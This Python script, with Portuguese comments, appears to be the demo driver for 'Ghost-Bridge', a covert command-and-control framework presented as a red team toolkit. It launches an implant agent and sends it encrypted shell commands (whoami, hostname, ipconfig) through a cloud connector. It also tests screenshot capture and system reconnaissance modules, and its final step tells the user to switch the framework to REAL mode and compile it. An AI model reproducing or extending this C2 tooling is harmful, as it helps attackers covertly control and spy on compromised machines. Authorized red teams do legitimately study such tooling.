"""
Ghost-Bridge - Demo Completa
Demonstra todas as capacidades do toolkit.
"""
import subprocess
import time
import sys
import os
import json
from connectors import get_connector
import crypto_utils


def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗                     ║
║  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝                     ║
║  ██║  ███╗███████║██║   ██║███████╗   ██║                        ║
║  ██║   ██║██╔══██║██║   ██║╚════██║   ██║                        ║
║  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║                        ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝                        ║
║                                                                   ║
║   ██████╗ ██████╗ ██╗██████╗  ██████╗ ███████╗                   ║
║   ██╔══██╗██╔══██╗██║██╔══██╗██╔════╝ ██╔════╝                   ║
║   ██████╔╝██████╔╝██║██║  ██║██║  ███╗█████╗                     ║
║   ██╔══██╗██╔══██╗██║██║  ██║██║   ██║██╔══╝                     ║
║   ██████╔╝██║  ██║██║██████╔╝╚██████╔╝███████╗                   ║
║   ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝                   ║
║                                                                   ║
║          Covert C2 Framework | Red Team Toolkit                  ║
║                       v2.0 - Full Edition                        ║
╚══════════════════════════════════════════════════════════════════╝
    """)


def run_simple_demo():
    """Demo simples: comando shell."""
    print("\n" + "="*60)
    print("  DEMO 1: Comunicação Básica (Shell Command)")
    print("="*60)
    
    # Limpa banco de dados antigo
    if os.path.exists("mock_cloud.json"):
        os.remove("mock_cloud.json")
    
    # Inicia o agente em background
    print("\n[*] Iniciando Agente em background...")
    agent_process = subprocess.Popen(
        [sys.executable, "agent.py"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    time.sleep(2)
    
    # Envia comando
    connector = get_connector()
    cmd = "whoami"
    print(f"\n[>] Enviando comando: '{cmd}'")
    
    encrypted_cmd = crypto_utils.encrypt_data(cmd)
    cmd_id = connector.post_command(encrypted_cmd)
    
    # Aguarda resposta
    print("[*] Aguardando resposta...")
    found = False
    
    for _ in range(15):
        results = connector.get_results()
        for res in results:
            if res['command_id'] == cmd_id:
                decrypted = crypto_utils.decrypt_data(res['data'])
                print(f"\n[<] RESPOSTA:")
                print("-" * 40)
                print(decrypted.strip())
                print("-" * 40)
                found = True
                break
        if found:
            break
        time.sleep(1)
        print(".", end="", flush=True)
    
    if not found:
        print("\n[!] Timeout - sem resposta")
    
    agent_process.terminate()
    return found


def run_toolkit_demo():
    """Demo do toolkit: comandos especiais."""
    print("\n" + "="*60)
    print("  DEMO 2: Toolkit Commands")
    print("="*60)
    
    commands = [
        ("!info", "Informações do Agente"),
        ("!modules", "Módulos Disponíveis"),
        ("!screenshot", "Captura de Tela"),
        ("!recon", "Reconhecimento do Sistema"),
    ]
    
    for cmd, desc in commands:
        print(f"\n[*] Testando: {desc}")
        print(f"    Comando: {cmd}")
        
        result = subprocess.run(
            [sys.executable, "agent.py", "--test", cmd],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        output = result.stdout
        
        # Para resultados longos, mostra apenas preview
        if len(output) > 500:
            try:
                data = json.loads(output)
                print(f"    Resultado: {type(data).__name__} com {len(data)} chaves")
            except:
                print(f"    Resultado: {len(output)} caracteres")
        else:
            print(f"    Resultado: {output[:200]}...")
        
        print("    ✓ OK")


def run_full_demo():
    """Demo completa com agente rodando."""
    print("\n" + "="*60)
    print("  DEMO 3: Full C2 Simulation")
    print("="*60)
    
    if os.path.exists("mock_cloud.json"):
        os.remove("mock_cloud.json")
    
    # Inicia agente
    print("\n[*] Iniciando Agente...")
    agent = subprocess.Popen(
        [sys.executable, "agent.py"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    time.sleep(3)
    
    connector = get_connector()
    
    test_commands = [
        "!info",
        "hostname",
        "!modules",
        "ipconfig",
    ]
    
    for cmd in test_commands:
        print(f"\n[>] Enviando: {cmd}")
        
        encrypted = crypto_utils.encrypt_data(cmd)
        cmd_id = connector.post_command(encrypted)
        
        # Aguarda resposta
        for _ in range(10):
            results = connector.get_results()
            for res in results:
                if res['command_id'] == cmd_id:
                    decrypted = crypto_utils.decrypt_data(res['data'])
                    preview = decrypted[:150] + "..." if len(decrypted) > 150 else decrypted
                    print(f"[<] {preview}")
                    break
            else:
                time.sleep(1)
                continue
            break
    
    agent.terminate()
    print("\n[✓] Demo completa finalizada!")


def main():
    print_banner()
    
    print("\n[?] Selecione o modo de demonstração:")
    print("    1. Demo Simples (comando shell)")
    print("    2. Demo Toolkit (comandos especiais)")
    print("    3. Demo Completa (simulação C2)")
    print("    4. Todas as demos")
    print("    0. Sair")
    
    try:
        choice = input("\n    Escolha [1-4]: ").strip()
    except:
        choice = "1"
    
    if choice == "1":
        run_simple_demo()
    elif choice == "2":
        run_toolkit_demo()
    elif choice == "3":
        run_full_demo()
    elif choice == "4":
        run_simple_demo()
        run_toolkit_demo()
        run_full_demo()
    else:
        print("[*] Saindo...")
        return
    
    print("\n" + "="*60)
    print("  DEMONSTRAÇÃO FINALIZADA")
    print("="*60)
    print("\nPróximos passos:")
    print("  1. Configure o .env com suas credenciais")
    print("  2. Mude OPERATION_MODE para REAL")
    print("  3. Compile com: python build.py")
    print()


if __name__ == "__main__":
    main()
